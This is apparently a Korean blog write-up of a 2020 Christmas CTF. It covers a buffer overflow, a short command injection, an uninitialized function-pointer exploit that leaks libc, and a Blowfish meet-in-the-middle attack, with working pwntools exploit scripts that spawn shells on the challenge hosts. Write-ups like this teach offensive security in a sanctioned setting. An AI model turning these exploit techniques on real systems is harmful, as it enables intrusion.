---
layout: post
title: 2020 Christmas CTF write-up
categories: ctf-write-up
tags: [ctf]
---

## **baby_RudOlPh**

arm 문제라서 나중에 풀어야하지하고 다른 문제들을 먼저 열어봤는데 답이없어서 그냥 이거나풀자했다가 운좋게 퍼블 먹은 문제다.

bof가 발생하는데 get_arm이라는 함수를 보면 인자를 0x1225로 주고 호출할 경우 /bin/sh를 실행시켜주는 루틴이 있었다.

근데 이러한 구성이라면 굳이 get_arm을 호출할 필요없이 이 함수의 내부에 있는 system("/bin/sh")를 호출하면된다.

```python
from pwn import *

p = remote("host4.dreamhack.games", 10159)

p.recvline()
p.send(p64(0x40069C) * 30)

p.interactive()
```

`XMAS{baby_RudOlPh's_ARM_s0_ez!!}`


---


## **picky_eater**

게임을 열심히해서 플래그를 얻었는데 인증이 안됐다. 그래서 계속보는데 디스크립션을 보니 뱀이 먹기 싫은걸 먹으면 티를 낸다고 한다.

그래서 계속 게임을 플레이하면서 뱀을 관찰하는데 아무리봐도 모르겠고 딱봐도 플래그가 solo pricky snake 꼴일 것이기 때문에 브루트포싱을 해봤는데 모든 경우의수를 넣은거 같았지만 인증이 되지 않았따.

그러다가 혹시나하고 이상한거 먹으면 뱀의 몸뚱아리가 안커지는건가 싶어서 하나 둘 세봣는데 내 예상이 맞아서 게임을 계속 플레이하면서 뱀의 몸뚱아리를 세는 작업을 했다...

풀고나니간 팀원분이 아이다로 열어보면 인덱스가 있다고 알려줬다. (원래 문제는 노가다로 풀어야 재밌다.)

`XMAS{$o_P1cky_$n4k3!}`


---


## **Oil system**

첨엔 먼가 좀 복잡해 보여서 안풀고있다가 갑자기 1솔브가 빠르게 나길래 뭔가 해서 봤는데 언인텐이 숨어있었다.

첫글자만 검사하기 때문에 5바이트 커맨드 인젝션이 터진다.

cat으로 플래그를 읽으려했는데 길이가 딸려서 `nl f*`로 읽었다. (근데 생각해보면 sh 입력해서 셸 따고 플래그 읽으면 되는데..)

`XMAS{U5e_Ma11oc_Nex7_tim3_Mr_Kim}`


---


## **Match_Maker**

처음에 이 문제를 보고 취약점이 안보여서 제로데이가 아닌가를 의심했다. leak 같은 경우엔  이름을 입력받을때 read로 받고 strncpy 함수로 복사하는 특이한 동작을 해서 `uninitialized variable` 때문에 쉽게 된다.

rip를 잡는데 조오금 고생을 했는데 아무리봐도 함수 포인터를 조지는 방법 밖에 없고 취약점이 있을만한 부분은 함수 포인터를 넣어주는 곳 밖에 없을거라 생각해서 해당 부분을 유심히 봤다.

```c
__int64 (__fastcall *__fastcall sub_1C82(__int64 a1))()
{
  int v2; // [rsp+8h] [rbp-10h]
  int v3; // [rsp+Ch] [rbp-Ch]
  __int64 (__fastcall *v4)(); // [rsp+10h] [rbp-8h]

  v2 = *(_DWORD *)(a1 + 44) * *(_DWORD *)(a1 + 44);
  v3 = *(_DWORD *)(a1 + 48) * *(_DWORD *)(a1 + 48);
  if ( v2 > v3 )
    v4 = sub_1630;
  if ( v3 > v2 )
    v4 = sub_1486;
  return v4;
}
```

이 부분을 보면 두 if 문에 해당하지 않을 경우 v4에 아무런 값을 넣어주지 않고 그대로 return을 한다. leak 취약점과 마찬가지로 스택이 초기화되어 있지 않기 때문에 이전에 read 함수로 입력받은 값이 v4에 들어가있어서 함수 포인터에 원하는 값을 넣을 수 있게 된다.

저 조건을 구하기 위해선 나이 3개를 입력받을때 적절한 값을 입력해야하는데, z3로 구했다.

```python
from z3 import *

s = Solver()

x = BitVec('x', 32)
y = BitVec('y', 32)
z = BitVec('z', 32)

r1 = BitVec('r1', 32)
r2 = BitVec('r2', 32)
s.add(And(0 < x, x < 18))
s.add(y >= 18)
s.add(z >= 19)

r1 = (x - y) & 0xffffffff
r2 = (z - y) & 0xffffffff
s.add(z > y)
s.add(((r1 * r1) & 0xffffffff) == (r2 * r2) & 0xffffffff)
print(s.check())
print(s.model())
```



그리고 one_gadget들은 다 맞지 않던데 인자로 read 함수에 입력받은 값 앞 부분이 들어가는걸 확인해서 system("sh")를 호출가능했다.

```python
from pwn import *

#p = process('./match')
p = remote("host7.dreamhack.games", 13295)
e = ELF('./match')
libc = e.libc

def make(age, name, minage, maxage, sex, h1, h2, h3):
    p.sendlineafter('> ', '0')
    p.sendlineafter(': ', str(age))
    p.sendafter(': ', name)
    p.sendlineafter(': ', str(minage))
    p.sendlineafter(': ', str(maxage))
    p.sendlineafter('> ', str(sex))
    p.sendafter(': ', h1)
    p.sendafter(': ', h2)
    p.sendafter(': ', h3)

def save():
    p.sendlineafter('> ', '1')

def find():
    p.sendlineafter('> ', '2')

def show():
    p.sendlineafter('> ', '3')


make(0x20, 'A' * 0x8, 0x10, 0x30, 0, 'B' * 0xf, 'C' * 0xf, 'D' * 0xf)
show()

p.recvuntil('A' * 8)
leak = u64(p.recv(6).ljust(8, '\x00')) - 0x6f013 - 0x25000
system = leak + libc.sym['system']

make(748778063, 'sh\x00' + 'A' *  0xd + p64(system), 11, 1073741835, 0, 'B' * 0xf, 'C' * 0xf, 'D' * 0xf)
find()

p.interactive()
```

`XMAS{1_d0n7_w4nna_kn0w_who'5_tak1ng_U_h0me}`


---


## **phantom**

CCE 예선전에서 본 유형인데 그 당시에 코드를 잘못짜서 못풀엇던 기억이 난다.. `Meet-in-the-middle attack` 이고 코드는 이렇게 짰다.

```python
from Crypto.Cipher import Blowfish
import base64

enc = "m6US+8OA+WK1Dl2kLc60Kxp2o3ydWPuXbZK2vBOrQEPTSzH6Od6Qn137Ctn7oLqm7Nb2uvb2wHU="
flag = base64.b64decode(enc)

enc = "QUJDREVGR0g="
enc = base64.b64decode(enc)

dec = "J8LFHyoEuoo="
dec = base64.b64decode(dec)

keya = []
keyb = []
a = []
b = []

for i in range(0xff + 1):
    for j in range(0xff + 1):
        K1 = ('\x9e\x91\x9b\xb3\x3a\xef' + chr(i) + chr(j))
        K2 = (chr(i) + chr(j) + '\xf6\xea\x6d\x93\x7f\x22')

        encbf = Blowfish.new(K1, Blowfish.MODE_ECB)
        decbf = Blowfish.new(K2, Blowfish.MODE_ECB)

        a.append(encbf.encrypt(enc))
        keya.append(K1)
        b.append(decbf.decrypt(dec))
        keyb.append(K2)

print "done"

for i in range(len(a)):
    if a[i] in b:
        keya = keya[i]
        print "get keya"
        print keya.encode("hex")
        break

for i in range(len(b)):
    if b[i] in a:
        keyb = keyb[i]
        print "get keyb"
        print keya.encode("hex")
        break

aaa = Blowfish.new(keya, Blowfish.MODE_ECB)
bbb = Blowfish.new(keyb, Blowfish.MODE_ECB)

flag = bbb.decrypt(flag)
flag = aaa.decrypt(flag)

print flag
```
